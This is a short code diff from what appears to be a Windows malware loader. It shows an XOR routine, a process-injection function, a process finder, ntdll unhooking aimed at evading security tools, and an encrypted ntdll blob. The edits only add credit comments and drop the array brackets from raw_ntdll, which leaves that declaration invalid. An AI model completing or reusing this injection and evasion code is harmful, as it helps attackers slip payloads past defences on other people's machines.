@@ -64,7 +64,7 @@ void XOR(char * data, size_t data_len, char * key, size_t key_len) {
 	}
 }
 
-//Classic Injection
+//Classic Injection, thanks @reenz0h
 int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 	
 	LPVOID pRemoteCode = (LPVOID) rand();
@@ -86,7 +86,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
 }
 
 
-//Classic find process by name
+//Classic find process by name, thanks @reenz0h
 int FindTarget(const char *procname) {
 
         HANDLE hProcSnap;
@@ -320,7 +320,7 @@ static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
 
 using namespace std;
 //Encrypted ntdll
-unsigned char raw_ntdll[] = {[...snip...]}
+unsigned char raw_ntdll = {[...snip...]}
 
 int main(VOID){
 
